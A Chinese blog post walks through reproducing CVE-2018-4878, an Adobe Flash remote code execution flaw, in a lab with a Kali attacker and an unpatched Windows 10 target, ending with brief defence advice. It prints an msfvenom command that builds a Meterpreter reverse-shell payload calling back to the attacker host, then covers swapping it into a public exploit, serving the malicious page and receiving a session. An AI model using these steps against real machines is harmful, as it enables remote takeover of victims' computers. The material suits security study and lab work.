# Adboe Flash远程代码执行_CVE-2018-4878漏洞复现 - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11104935.html](https://www.cnblogs.com/yuzly/p/11104935.html)

Adboe Flash远程代码执行_CVE-2018-4878漏洞复现

**一、漏洞描述**

该漏洞可针对windows用户发起定向攻击。攻击者可以诱导用户打开包含恶意Flash代码文件的Microsoft Office文档、网页、垃圾电子邮件等。

**二、漏洞影响版本**

Flash Player版本28.0.0.137以及之前的所有版本

　　![](../Images/9aafc9c77c296f1c30f6197675a34d59.png)

**三、漏洞复现环境搭建**

攻击机:kali   ip:192.168.10.136

靶机:win10   ie默认集成flash,没有升级

**四、漏洞复现**

1.github下载exp, [https://github.com/anbai-inc/CVE-2018-4878](https://github.com/anbai-inc/CVE-2018-4878)

2.修改exp

2.1修改shellcode为自己生成的反弹连接shellcode,首先先生成反弹连接shellcode

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.136 lport=8888 -f python >/root/shellcode.txt

　　![](../Images/62ff98b139f53d5378452a0600186816.png)

2.2用生成的shellcode替换exp中对应的shellcode

　　![](../Images/6aab32bb3b6551280557e41cd3d7f6cb.png)

2.3修改exp中生成文件保存的路径

　　![](../Images/865ae877281200446c2bc3684abb791b.png)

3.运行python脚本,会生成两个文件, exploit.swf和index.html

4.把exploit.swf和index.html复制到/var/www/html,然后开启web服务, 此时，Kali Linux上Web服务启动，并且具备index.html这个页面。只要靶机启用flash并访问了这个页面，则可以直接被控制

5.kali 开启监听

　　![](../Images/8bc840424db02a38ef8df8db07d33ac7.png)

6.靶机访问http://192.168.10.136/index.html

　　![](../Images/084ebf5410261126559a983cd9472f46.png)

7.此时kali端已经获取到会话

　　![](../Images/3a279cfc4031720a526424fa9d4ff4c8.png)

**五、漏洞防御**

1.下载最新版本的Adobe Flash

2.安装常见杀毒软件,开启实时防护和杀毒引擎实时升级